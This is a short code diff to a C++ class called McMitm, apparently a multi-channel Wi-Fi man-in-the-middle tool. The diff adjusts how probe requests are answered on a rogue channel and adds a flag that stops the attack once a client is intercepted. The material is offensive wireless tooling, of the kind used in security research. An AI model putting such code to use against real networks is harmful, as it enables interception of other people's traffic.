@@ -70,6 +70,7 @@ bool McMitm::handle_probe_request(const HWAddress<6> addr2, const PDU *pdu, cons
         display_client_traffic(*pdu, "Rogue channel", " -- Replied");
         return true;
     }
+    if(dot11.find_pdu<Dot11ProbeResponse>()) return true;
     return false;
 }
 
@@ -102,10 +103,6 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
         if(dot11->addr1() == client_mac || clients.contains(dot11->addr1().to_string())){
             display_client_traffic(*pdu, "Rogue channel");
         }
-    } else if(dot11->find_pdu<Dot11ProbeRequest>()){
-        probe_resp->addr1(addr2);
-        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
-        display_client_traffic(*pdu, "Rogue channel", " -- Replied");
     } else if(dot11->addr1() == ap_mac){
         ClientState *client = nullptr;
         bool will_forward = false;
@@ -117,6 +114,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
                 client->state <= ClientState::Connecting){
                 print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
                 client->mark_got_mitm();
+                if(only_to_mitm) stop_mitm = true;
             } else{
                 display_client_traffic(*pdu, "Rogue channel", " -- MitM'ing");
             }
@@ -129,6 +127,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
             print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
             auto new_client = ClientState(addr2.to_string());
             new_client.mark_got_mitm();
+            if(only_to_mitm) stop_mitm = true;
             add_client(new_client);
             client = clients.at(addr2.to_string()).get();
             will_forward = true;
